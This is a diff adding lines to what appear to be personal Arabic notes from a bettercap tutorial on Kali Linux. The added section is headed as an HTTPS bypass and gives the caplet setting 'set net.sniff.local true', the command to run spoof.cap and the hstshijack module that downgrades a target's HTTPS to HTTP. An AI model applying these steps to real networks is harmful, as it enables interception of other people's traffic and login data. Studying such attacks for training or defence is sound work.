@@ -237,8 +237,16 @@ USUAL APPLICATION
       sudo bettercap -caplet /home/kali/Desktop/spoof.cap
       وكدا يدخلنا على طول عن طريق هذا السطر فقط الى نظام المراقبة
      =============================== https  تجاوز ==========================
-     
-     
+     اول شي نوقف العمليات  ونروح على الملف اللي سويناه spoof.cap
+     ونضيف السطر التالي بعد السطر الرابع
+     set net.sniff.local true
+     ومعناه اي شي يجي من الهدف بعدين يجي في كالي نبغى نراقبه
+     وبعدها نشغل البيتر كاب 
+     sudo bettercap -caplet /home/kali/Desktop/spoof.cap
+     بعد مايشتغل نكتب العبارة التالية
+     hstshijack/hstshijack
+     وهي العبارة اللي تخلي https become http
+     2:30
      
      
      
